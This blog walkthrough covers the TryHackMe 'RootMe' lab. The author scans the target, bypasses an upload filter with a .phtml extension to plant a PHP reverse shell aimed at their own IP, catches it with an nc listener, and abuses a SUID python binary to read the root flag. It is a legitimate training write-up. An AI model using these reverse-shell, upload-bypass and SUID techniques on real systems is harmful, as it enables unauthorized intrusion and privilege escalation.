# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# THM | RootMe 

Another THM Privilege Escalation Machine 🔓

Released: 2024-02-28


## Nmap Scan

```bash
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.102.215
[sudo] password for vipin: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 23:18 EST
Nmap scan report for 10.10.102.215
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

- Only ports 22 & 80 are open.

> Port 22 - **ssh**  
> Port 80 - **http Apache 2.4.29**

## Dirsearch

- Whilst the room advises us to use *Gobuster*, instead I will use *Dirsearch*.

![Image showing the results of dirsearch](blog/rootmepics/dirsearch.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1 *Dirsearch Results*</small>
</div>

- The only hidden/useful directory to us is `/panel`

## Obtaining the User Flag

- In `/panel`, we find an upload panel (Fig.2)...

![Image showing the upload panel](blog/rootmepics/uploadpanel.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2</small>
</div>

- We might need to find or make a PHP script to gain user access.

- A community favorite for gaining a reverse shell is [this PHP script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Make sure to modify lines 49 & 50 with your IP & Port (up to you). Optional: change 54 with your desired shell.

``` bash
49 $ip = '10.2.121.184';  // CHANGE THIS
50 $port = 4444;       // CHANGE THIS
···
54 $shell = 'uname -a; w; id; /bin/bash -i';
```

- I originally attempted to bypass the PHP filter by renaming the file to *"revshell.png.php"* and as we can see, it didn't end well...

![Image showing the upload panel angry at me](blog/rootmepics/phpuploaddenied.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1 *A Furious Upload Panel*</small>
</div>

- The upload panel is mad at me ☹️

- The next solution was to rename the file to *"revshell.phtml"* and it successfully uploaded! After that, head to `/uploads` and click on the uploaded PHP script for it to run. 

```bash
# Note: Before I modified the script to use bash, I used sh
┌──(vipin㉿vipin)-[~]
└─$ nc -lvnp 4444 # Set up a listener before clicking the PHP script.
listening on [any] 4444 ...
connect to [10.2.121.184] from (UNKNOWN) [10.10.102.215] 48754
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:09:16 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
cat /var/www/user.txt
THM{XXXXXXXXXXXX}
```
- #### User.txt Acquired 😎

## Aquiring Root Privileges

- The hint provides a command to search for **SUID Binaries**. After running it, there were only a select few that were potential **SUID Binaries** with `/usr/bin/python` being the prime suspect.

- We can take advantage of Python being an **SUID Binary** by exploiting it to read the root flag file. [GTFObins](https://gtfobins.github.io/gtfobins/python/#file-read) has various methods to take advantage of these **SUID Binaries**.

```bash
www-data@rootme:/$ python -c 'print(open("/root/root.txt").read())' 
python -c 'print(open("/root/root.txt").read())'
THM{XXXXXXXXXXXXXXXXXXX}
```

### MACHINE PWN'ED 😎

